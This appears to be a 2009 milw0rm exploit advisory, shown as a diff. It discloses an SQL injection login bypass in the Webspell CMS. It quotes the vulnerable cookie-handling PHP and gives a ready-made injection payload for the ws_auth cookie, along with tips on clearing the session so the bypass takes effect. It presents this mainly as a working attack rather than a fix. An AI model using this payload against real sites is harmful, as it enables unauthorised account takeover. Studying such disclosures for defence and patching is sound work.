@@ -1,0 +1,81 @@
+#Webspell Login Bypass
+#Found by: h0yt3r
+#
+##
+#Checklogin.php Line 60:
+#
+#        setcookie("ws_auth", $ds['userID'].":".$ws_pwd, time()+($sessionduration*60*60));
+#        $login = 1;
+#
+##
+#_functions.php Line 253:
+#
+#        $login_per_cookie = false;
+#        if(isset($_COOKIE['ws_auth']) AND !isset($_SESSION['ws_auth'])) {
+#         $login_per_cookie = true;
+#         $_SESSION['ws_auth'] = $_COOKIE['ws_auth'];
+#        }
+##
+#src/login.php:
+#
+#        global $userID, $loggedin;
+#
+#        $userID = 0;
+#        $loggedin=false;
+#
+#        if(isset($_SESSION['ws_auth'])) {
+#          if(stristr($_SESSION['ws_auth'], "userid")===FALSE){
+#            $authent = explode(":", $_SESSION['ws_auth']);
+#            $ws_user = sprintf('%u', $authent[0]);
+#
+#            // ws_pwd must be a string without spaces and with a maximum length of 32       <- ???
+#                  $ws_pwd = substr(str_replace(' ', '', $authent[1]), 0, 32);
+#
+#                  if(isset($ws_user) AND isset($ws_pwd)) {
+#
+#                $check = safe_query("SELECT userID FROM ".PREFIX."user WHERE userID='$ws_user' AND password='$ws_pwd'");
+#
+#                          while($ds=mysql_fetch_array($check)) {
+#                      $loggedin=true;
+#                            $userID=$ds['userID'];
+#                    }
+#                }
+#                } else die();
+#        }
+#        ?>
+#
+#
+####
+
+// ws_pwd must be a string without spaces and with a maximum length of 32
+                 $ws_pwd = substr(str_replace(' ', '', $authent[1]), 0, 32);
+
+Wuta fuck is dis crap?!
+$_COOKIE['ws_auth'] can be exploited by somting like dis:
+1:'or/**/1=1/**/limit/**/0,1#   (# <- is a comment, dont forget...)
+And btw:
+$_SESSION['ws_auth'] = $_COOKIE['ws_auth'];
+So dont foget to delete teh session...
+Bad thing: Only works wit magic_quotes == off
+
+But they got some function:
+#_functions.php:74
+#function sql_quote($value) {
+#
+#    if( get_magic_quotes_gpc() )    {
+#        $value = stripslashes( $value );
+#    }
+#    if( function_exists( "mysql_real_escape_string" ) ) {
+#        $value = mysql_real_escape_string( $value );
+#    }
+#    else
+#    {
+#        $value = addslashes( $value );
+#        }
+#    return $value;
+#}
+And why in the world isnt it used?!
+
+~END~
+
+# milw0rm.com [2009-01-03]
